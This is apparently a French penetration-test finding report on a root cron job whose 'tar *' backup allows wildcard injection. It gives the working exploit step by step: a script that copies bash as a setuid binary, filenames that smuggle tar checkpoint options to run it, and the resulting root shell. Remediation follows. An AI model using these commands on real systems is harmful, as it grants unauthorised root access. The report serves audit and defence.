# VULN-06 — CRONTAB Wildcard Injection (Privilege Escalation)

**Sévérité :** CRITIQUE (CVSS 9.3)
**OWASP :** A03:2021 Injection
**CWE :** CWE-77 Command Injection / CWE-88 Argument Injection
**Vecteur :** /etc/crontab (tâche root, toutes les 5 minutes)

---

## Description

Une tâche planifiée exécutée par root toutes les 5 minutes utilise la commande `tar` avec un wildcard `*` pour sauvegarder tous les fichiers du répertoire `/home/john/`. Tar interprète les noms de fichiers commençant par `--` comme des options de commande. En créant des fichiers avec des noms spéciaux, il est possible de faire exécuter du code arbitraire par la tâche root.

---

## Découverte

Depuis le compte alice, lecture de la crontab système :

```bash
cat /etc/crontab
```

Ligne critique identifiée :

```
*/5 * * * *   root   cd /home/john/ && tar -zcf /home-john-backup.tgz *
```

Trois signaux d'alarme :
* Exécuté par **root** (droits maximum)
* Utilisation du wildcard **\*** (expansion non contrôlée)
* Répertoire sous contrôle d'un utilisateur non-root

---

## Exploitation

### Étape 1 — Écriture du script malveillant

```bash
echo '#!/bin/bash' > /home/john/shell.sh
echo 'cp /bin/bash /tmp/rootbash_pro && chmod +s /tmp/rootbash_pro' >> /home/john/shell.sh
chmod +x /home/john/shell.sh
```

### Étape 2 — Création des fichiers-pièges

```bash
# touch -- évite que le shell interprète les -- comme options de touch
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

### Étape 3 — Attente du cycle cron (max 5 min)

La commande tar exécutée par root devient :

```bash
# Tar original
tar -zcf /home-john-backup.tgz *

# Interprété après expansion du wildcard
tar -zcf /home-john-backup.tgz --checkpoint=1 --checkpoint-action=exec=sh shell.sh notes.txt shell.sh
```

Les noms de fichiers sont traités comme des options, ce qui force tar à exécuter `shell.sh` via son mécanisme de checkpoint.

### Étape 4 — Utilisation de l'accès root

```bash
/tmp/rootbash_pro -p
rootbash_pro-5.0# whoami
root
```

---

## Impact

Contrôle total et permanent du serveur avec les droits root. Cet accès survit aux redémarrages. Un attaquant peut lire tous les fichiers, modifier des configurations, créer des backdoors, effacer des logs.

**Impact GRC :** Score CVSS 9.3. Violation CWE-77/88. Contrôle A.8.9 ISO 27001:2022 (gestion de la configuration) non respecté. Incident notifiable sous NIS2 pour une entité essentielle.

---

## Remédiation

```bash
# Correction dans /etc/crontab
# Avant
*/5 * * * * root cd /home/john/ && tar -zcf /home-john-backup.tgz *

# Après (option 1 : délimiteur --)
*/5 * * * * root cd /home/john/ && tar -zcf /home-john-backup.tgz -- *

# Après (option 2 : chemin absolu, plus sûr)
*/5 * * * * backup_user tar -zcf /home-john-backup.tgz /home/john/
```

Appliquer le principe de moindre privilège : la sauvegarde n'a pas besoin de droits root.

---

## Références

* [GTFOBins tar](https://gtfobins.github.io/gtfobins/tar/)
* [CWE-88](https://cwe.mitre.org/data/definitions/88.html)
* [Wildcard Injection — HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks)

**MITRE ATT&CK :** T1053.003 Cron, T1548 Abuse Elevation Control Mechanism, TA0004 Privilege Escalation
